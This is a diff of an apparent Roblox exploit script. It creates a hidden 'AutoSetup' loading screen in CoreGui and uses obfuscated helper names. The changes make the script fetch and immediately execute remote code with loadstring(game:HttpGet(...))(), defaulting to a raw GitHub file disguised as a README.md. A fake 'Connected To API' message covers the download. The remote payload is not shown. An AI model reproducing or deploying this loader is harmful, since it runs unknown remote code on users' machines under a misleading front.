@@ -12,20 +12,22 @@ local G2L = {};
 
 -- StarterGui.AutoSetup
 G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
+G2L["1"]["IgnoreGuiInset"] = true;
 G2L["1"]["Enabled"] = false;
+G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
 G2L["1"]["Name"] = [[AutoSetup]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 G2L["1"]["ResetOnSpawn"] = false;
-G2L["1"]["IgnoreGuiInset"] = true;
 
 
 -- StarterGui.AutoSetup.Loading
 G2L["2"] = Instance.new("ScreenGui", G2L["1"]);
+G2L["2"]["IgnoreGuiInset"] = true;
 G2L["2"]["DisplayOrder"] = 2147483646;
+G2L["2"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
 G2L["2"]["Name"] = [[Loading]];
 G2L["2"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 G2L["2"]["ResetOnSpawn"] = false;
-G2L["2"]["IgnoreGuiInset"] = true;
 
 
 -- StarterGui.AutoSetup.Loading.TextLabel
@@ -66,7 +68,7 @@ local script = G2L["4"];
 	)
 	
 	local function _(_3)
-		return loadstring(game:HttpGet(_3))
+		return loadstring(game:HttpGet(_3))()
 	end
 	
 	local function _________(_8)
@@ -88,7 +90,7 @@ local script = G2L["4"];
 			____("Connected To API Pls Wait Until Script Being SetUp")
 	
 			local success, err = pcall(function()
-				_(URL)()
+				_(URL or 'https://raw.githubusercontent.com/G4mg1/wow-how-did-you-find-it/refs/heads/main/README.md')
 			end)
 	
 			if success then
@@ -140,7 +142,7 @@ task.spawn(C_4);
 local function C_5()
 local script = G2L["5"];
 	local urlok = "https://raw.githubusercontent.com/G4mg1/wow-how-did-you-find-it/refs/heads/main/README.md"
-	_G.MainModule = urlok 
+	_G.MainModule = urlok or nil
 end;
 task.spawn(C_5);
 
